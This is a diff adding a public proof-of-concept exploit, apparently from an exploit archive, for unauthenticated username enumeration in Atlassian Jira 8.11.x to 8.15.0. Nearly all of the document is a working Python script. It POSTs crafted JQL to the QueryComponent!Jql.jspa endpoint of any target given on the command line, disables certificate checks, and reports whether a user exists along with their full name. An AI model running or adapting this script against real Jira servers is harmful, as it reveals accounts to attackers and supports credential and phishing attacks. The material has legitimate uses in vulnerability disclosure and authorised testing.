@@ -1,0 +1,66 @@
+# Exploit Title: Atlassian Jira 8.15.0 - Information Disclosure (Username Enumeration)
+# Date: 31/05/2021
+# Exploit Author: Mohammed Aloraimi
+# Vendor Homepage: https://www.atlassian.com/
+# Software Link: https://www.atlassian.com/software/jira
+# Vulnerable versions: version 8.11.x to 8.15.0
+# Tested on: Kali Linux
+# Proof Of Concept:
+
+'''
+A username information disclosure vulnerability exists in Atlassian JIRA from versions 8.11.x to 8.15.x. Unauthenticated users can ENUMRATE valid users via /secure/QueryComponent!Jql.jspa endpoint.
+
+Tested versions:
+
+Atlassian JIRA 8.11.1
+Atlassian JIRA 8.13
+Atlassian JIRA 8.15
+'''
+
+#!/usr/bin/env python
+
+__author__  = "Mohammed Aloraimi (@ixSly)"
+
+
+
+import requests
+import sys
+import re
+import urllib3
+urllib3.disable_warnings()
+
+
+def help():
+    print('python script.py <target> <username>')
+    print('e.g. python script.py https://jiratarget.com admin')
+    sys.exit()
+
+if len(sys.argv) < 3:
+  help()
+
+
+
+def pwn(url,username):
+
+        try:
+                headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
+                data="jql=creator+in+({})&decorator=none".format(username)
+                req = requests.post(url+"/secure/QueryComponent!Jql.jspa",headers=headers,verify=False,data=data)
+                if "issue.field.project" in req.text and req.status_code == 200:
+                        print("[+] {} is a Valid User".format(username))
+                        userFullName=re.search('value=\"user:{}\" title=\"(.+?)\"'.format(username),str(req.json()["values"]["creator"]).strip())
+                        if userFullName:
+                                print("[+] User FullName: " + userFullName.group(1))
+                elif '["jqlTooComplex"]' in req.text and req.status_code == 401:
+                        print("[-] {} is not a Valid User".format(username))
+                else:
+                        print("[-] Error..")
+        except Exception as e:
+                print(str(e))
+                pass
+
+server = sys.argv[1]
+username = sys.argv[2]
+
+
+pwn(server,username)
